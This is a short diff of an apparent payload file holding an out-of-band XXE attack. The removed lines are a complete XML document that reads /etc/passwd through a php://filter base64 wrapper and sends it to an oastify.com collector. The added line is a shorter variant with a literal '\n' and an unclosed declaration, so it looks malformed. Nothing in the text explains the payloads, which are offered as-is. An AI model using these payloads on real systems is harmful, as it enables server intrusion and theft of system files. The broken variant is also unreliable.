@@ -1,6 +1,1 @@
-<?xml version="1.0"?>
-<!DOCTYPE r [
-    <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=etc/passwd">
-    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://twtih3adkwrlzb20j9ahqzhl1c73vtji.oastify.com/xxe/poc.xml?%data;'>">
-]>
-<r>&exfil;</r>
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://zz2ok9djn2ur2h56mfdnt5kr4ia9y0mp.oastify.com/poc.xml?%data;'>
